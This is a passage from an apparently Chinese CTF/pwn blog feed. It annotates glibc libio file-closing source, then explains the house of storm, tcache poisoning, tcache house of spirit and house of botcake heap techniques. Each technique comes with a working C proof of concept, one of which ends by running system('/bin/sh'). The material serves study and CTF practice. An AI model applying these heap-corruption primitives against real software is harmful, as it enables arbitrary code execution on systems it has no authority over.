class="hljs-comment">//再次调用_IO_un_link，确保结构体已从单链表中取下</span><br>  _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br><span class="hljs-comment">//更新相关结构体成员</span><br>  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;<br>  fp-&gt;_fileno = <span class="hljs-number">-1</span>;<br>  fp-&gt;_offset = _IO_pos_BAD;<br><br>  <span class="hljs-keyword">return</span> close_status ? close_status : write_status;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-file-close"><a href="#IO-file-close" class="headerlink" title="_IO_file_close"></a>_IO_file_close</h3><p>直接进行系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">int</span><br>_IO_file_close (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">return</span> close_not_cancel (fp-&gt;_fileno);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-setb-1"><a href="#IO-setb-1" class="headerlink" title="_IO_setb"></a>_IO_setb</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c </span><br><br><span class="hljs-type">void</span><br>_IO_setb (_IO_FILE *f, <span class="hljs-type">char</span> *b, <span class="hljs-type">char</span> *eb, <span class="hljs-type">int</span> a)<br>&#123;<br><span class="hljs-comment">//释放缓冲区</span><br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (f-&gt;_IO_buf_base);<br><span class="hljs-comment">//置空缓冲区指针</span><br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br><span class="hljs-comment">//设置相关标志位</span><br>  <span class="hljs-keyword">if</span> (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  <span class="hljs-keyword">else</span><br>    f-&gt;_flags |= _IO_USER_BUF;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-new-file-finish"><a href="#IO-new-file-finish" class="headerlink" title="_IO_new_file_finish"></a>_IO_new_file_finish</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">void</span><br>_IO_new_file_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (_IO_file_is_open (fp))<br>    &#123;<br><span class="hljs-comment">//刷新缓冲区</span><br>      _IO_do_flush (fp);<br><span class="hljs-comment">//如果文件为关闭，则调用_IO_SYSCLOSE关闭文件</span><br>      <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))<br>_IO_SYSCLOSE (fp);<br>    &#125;<br><span class="hljs-comment">//调用_IO_default_finish确认缓冲区已释放且结构体不在单链表中</span><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-default-finish"><a href="#IO-default-finish" class="headerlink" title="_IO_default_finish"></a>_IO_default_finish</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_default_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *<span class="hljs-title">mark</span>;</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    &#123;<br>      <span class="hljs-built_in">free</span> (fp-&gt;_IO_buf_base);<br>      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="hljs-literal">NULL</span>; mark = mark-&gt;_next)<br>    mark-&gt;_sbuf = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base)<br>    &#123;<br>      <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>      fp-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_lock != <span class="hljs-literal">NULL</span>)<br>    _IO_lock_fini (*fp-&gt;_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>IO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
      <tag>source code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of storm</title>
    <link href="/2023/02/08/house-of-storm/"/>
    <url>/2023/02/08/house-of-storm/</url>
    
    <content type="html"><![CDATA[<p>做hgame的时候有搜到过，现在来研究一下</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>主要利用的就是_int_malloc中整理unsorted bin将chunk放进large bin的过程，实现效果为伪造一个合法的chunk链入unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">     <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>       &#123;<br>         bck = victim-&gt;bk;<br><span class="hljs-comment">//检查chunk的大小是否符合unsorted bin</span><br>         <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>           malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                            chunk2mem (victim), av);<br>         size = chunksize (victim);<br><br>……<br><br><br><span class="hljs-comment">//从unsorted bin中摘下最后一个遍历过的chunk</span><br>         unsorted_chunks (av)-&gt;bk = bck;<br>         bck-&gt;fd = unsorted_chunks (av);<br><br><br>……<br><br><span class="hljs-comment">//否则放进large bin</span><br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             victim_index = largebin_index (size);<br>             bck = bin_at (av, victim_index);<span class="hljs-comment">//第一个小链表</span><br>             fwd = bck-&gt;fd;<span class="hljs-comment">//第二个小链表</span><br><br>             <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>             <span class="hljs-keyword">if</span> (fwd != bck)<span class="hljs-comment">//链表不空</span><br>               &#123;<br>                 <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                 size |= PREV_INUSE;<br>                 <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                 assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                 <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<span class="hljs-comment">//比最小的还小</span><br>                   &#123;<br><br>……<br><br>&#125;<br>                 <span class="hljs-keyword">else</span><br>                   &#123;<br>                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                     <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                       &#123;<br>                         fwd = fwd-&gt;fd_nextsize;<br>                         assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                       &#125;<span class="hljs-comment">//找到第一个比victim小的</span><br><br>                     <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                       <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                       fwd = fwd-&gt;fd;<br>                     <span class="hljs-keyword">else</span><br>                       &#123;<br>                         victim-&gt;fd_nextsize = fwd;<br>                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                         fwd-&gt;bk_nextsize = victim;<br>                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//接入nextsize链</span><br>                       &#125;<br>                     bck = fwd-&gt;bk;<br>                   &#125;<br>               &#125;<br>             <span class="hljs-keyword">else</span><span class="hljs-comment">//如果链空</span><br>               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>           &#125;<br><span class="hljs-comment">//接入bin链</span><br>         mark_bin (av, victim_index);<span class="hljs-comment">//标识binmap</span><br>         victim-&gt;bk = bck;<br>         victim-&gt;fd = fwd;<br>         fwd-&gt;bk = victim;<br>         bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-27以前"><a href="#2-27以前" class="headerlink" title="2.27以前"></a>2.27以前</h2><p><a href="https://www.cnblogs.com/Rookle/p/13140339.html">实验代码</a>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  presize;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  fd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  bk;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  fd_nextsize;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  bk_nextsize;<br>&#125;chunk;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *large_chunk,*unsorted_chunk;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *fake_chunk = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;chunk;<br>    <span class="hljs-type">char</span> *ptr;<br><br><br>    unsorted_chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0X20</span>);<br>    large_chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x408</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br><br><br>    <span class="hljs-built_in">free</span>(large_chunk);<br>    <span class="hljs-built_in">free</span>(unsorted_chunk);<br>    unsorted_chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);  <span class="hljs-comment">//large_chunk归位</span><br>    <span class="hljs-built_in">free</span>(unsorted_chunk);  <span class="hljs-comment">// unsorted_chunk归位</span><br><br><span class="hljs-comment">//重点一下3步</span><br>    unsorted_chunk[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )fake_chunk;<br>    large_chunk[<span class="hljs-number">1</span>]    = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )fake_chunk+<span class="hljs-number">8</span>;<br>    large_chunk[<span class="hljs-number">3</span>]    = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )fake_chunk<span class="hljs-number">-0x18</span><span class="hljs-number">-5</span>;<br><br>    <br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x48</span>);<br>    <span class="hljs-built_in">strncpy</span>(ptr, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">0x10</span>);<br>    system(((<span class="hljs-type">char</span> *)fake_chunk + <span class="hljs-number">0x10</span>));<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>重点过程如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk;<br><span class="hljs-comment">//bck=unsorted_chunk-&gt;bk=fake_chunk</span><br>size = chunksize (victim);<br><span class="hljs-comment">//size=chunksize(unsorted_chunk)</span><br><br>unsorted_chunks (av)-&gt;bk = bck;<br><span class="hljs-comment">//unsorted_bin-&gt;bk=fake_chunk</span><br>bck-&gt;fd = unsorted_chunks (av);<br><span class="hljs-comment">//fake_chunk-&gt;fd=unsorted_bin</span><br><span class="hljs-comment">//fake_chunk链入unsorted bin</span><br><br>victim_index = largebin_index (size);<br>bck = bin_at (av, victim_index);<br><span class="hljs-comment">//bck=large_bin</span><br>fwd = bck-&gt;fd;<br><span class="hljs-comment">//fwd=large_bin-&gt;fd=large_chunk</span><br><br>victim-&gt;fd_nextsize = fwd;<br><span class="hljs-comment">//unsorted_chunk-&gt;fd_nextsize=large_chunk</span><br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br><span class="hljs-comment">//unsorted_chunk-&gt;bk_nextsize=large_chunk-&gt;bk_nextsize</span><br><span class="hljs-comment">// =fake_chunk-0x18-5</span><br>fwd-&gt;bk_nextsize = victim;<br><span class="hljs-comment">//large_chunk-&gt;bk_nextsize=unsorted_chunk</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize</span><br><span class="hljs-comment">//=(fake_chunk-0x18-5)-&gt;fd_nextsize</span><br><span class="hljs-comment">//=fake_chunk+3=unsorted_chunk</span><br><span class="hljs-comment">//伪造fake_chunk的size，size成员为unsorted_chunk地址的最高三字节</span><br><span class="hljs-comment">//heap地址最高三字节为0，第四字节为0x56或0x55</span><br><br>bck = fwd-&gt;bk;<br><span class="hljs-comment">//bck=large_chunk-&gt;bk=fake_chunk+8</span><br>mark_bin (av, victim_index);<span class="hljs-comment">//标识binmap</span><br>victim-&gt;bk = bck;<br><span class="hljs-comment">//unsorted_chunk-&gt;bk=fake_chunk+8</span><br>victim-&gt;fd = fwd;<br><span class="hljs-comment">//unsorted_chunk-&gt;fd=large_chunk</span><br>fwd-&gt;bk = victim;<br><span class="hljs-comment">//large_chunk-&gt;bk=unsorted_chunk</span><br>bck-&gt;fd = victim;<br><span class="hljs-comment">//(fake_chunk+8)-&gt;fd=fake_chunk-&gt;bk=unsorted_chunk</span><br><span class="hljs-comment">//伪造fake_chunk的bk指向合法地址</span><br></code></pre></td></tr></table></figure><p>伪造的size为0x56或0x55，所以malloc一个0x48的chunk（实际大小0x50）会返回fake_chunk</p><h2 id="2-28以后"><a href="#2-28以后" class="headerlink" title="2.28以后"></a>2.28以后</h2><p>_int_malloc中整理unsorted bin时新增检查chunk的连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcache相关</title>
    <link href="/2023/02/08/tcache%E7%9B%B8%E5%85%B3/"/>
    <url>/2023/02/08/tcache%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p>tcache的几种利用都挺简单的，就打个包放一起了(decrypt safing linking见safe linking篇)</p><span id="more"></span><h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><h2 id="2-31以前"><a href="#2-31以前" class="headerlink" title="2.31以前"></a>2.31以前</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">// disable buffering</span><br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">size_t</span> stack_var;<br><span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><br>b[<span class="hljs-number">0</span>] = (<span class="hljs-type">intptr_t</span>)&amp;stack_var;<br><br><span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><br>assert((<span class="hljs-type">long</span>)&amp;stack_var == (<span class="hljs-type">long</span>)c);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>更改tcache中chunk的fd指针，比fastbin更方便因为没有size的检查</p><h2 id="2-32以后"><a href="#2-32以后" class="headerlink" title="2.32以后"></a>2.32以后</h2><p>新增chunk地址对齐检查和safe linking机制<br>注意fd指向fake chunk的地址要对齐0x10并加密</p><h1 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h1><p>直接free fake chunk放进tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><span class="hljs-comment">//堆初始化</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a; <span class="hljs-comment">//pointer that will be overwritten</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>]; <span class="hljs-comment">//fake chunk region</span><br><br>fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><span class="hljs-comment">//注意地址对齐0x10</span><br>a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br><br>assert((<span class="hljs-type">long</span>)b == (<span class="hljs-type">long</span>)&amp;fake_chunks[<span class="hljs-number">2</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><p>原理有点类似于fastbin dup consolidate，将chunk同时放进unsorted bin和tcache形成uaf的效果</p><h2 id="2-31以前-1"><a href="#2-31以前-1" class="headerlink" title="2.31以前"></a>2.31以前</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br><br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br><br>    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    